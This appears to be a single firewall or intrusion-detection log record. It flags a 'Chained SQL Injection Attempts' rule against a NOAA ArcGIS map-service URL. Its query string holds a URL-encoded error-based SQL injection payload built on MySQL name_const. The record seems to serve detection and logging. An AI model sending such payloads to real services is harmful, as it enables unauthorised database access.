code = 981249
description = 'Chained SQL Injection Attempts 2/2'
uri = 'http://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Climate_Outlooks/cpc_wkly_sst/MapServer'
query_string = 'f=pjson%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1'
